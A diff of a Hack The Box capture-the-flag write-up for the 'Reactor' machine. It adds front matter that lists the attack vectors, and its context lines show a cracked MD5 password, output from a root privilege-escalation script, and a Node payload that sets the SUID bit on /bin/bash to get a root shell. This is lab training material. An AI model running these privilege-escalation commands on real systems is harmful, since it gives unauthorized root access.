@@ -1,3 +1,20 @@
+---
+title: "Reactor - Hack The Box"
+target: "Reactor"
+os: "Linux"
+difficulty: "Medium"
+status: "Pwned"
+vectors: "Apache NiFi Processor Creation RCE, JVM Process Extraction, Custom Sudo Binary PrivEsc"
+tags:
+  - ciber
+  - htb
+  - apache-nifi
+  - jvm
+  - rce
+  - sudo
+synced: "2026-10-16 12:38"
+---
+
 # Reactor - Hack The Box Writeup
 
 ## Reconnaissance
@@ -172,7 +189,6 @@ Dictionary cache hit:
 39d97110eafe2a9a68639812cd271e8e:reactor1
 Approaching final keyspace - workload adjusted.
 
-
 Session..........: hashcat
 Status...........: Exhausted
 Hash.Mode........: 0 (MD5)
@@ -260,7 +276,6 @@ engineer@reactor:~$ python3 node_inspector_lpe.py --payload id
 
 uid=0(root) gid=0(root) groups=0(root)
 
-
 [*] Done.
 ```
 
@@ -286,8 +301,6 @@ engineer@reactor:~$ python3 node_inspector_lpe.py --payload suid
 [*] Evaluating: require('child_process').execSync('chmod +s /bin/bash').toString()
 
 [+] Result:
-
-
 
 [*] SUID bit set. Now run:
       bash -p
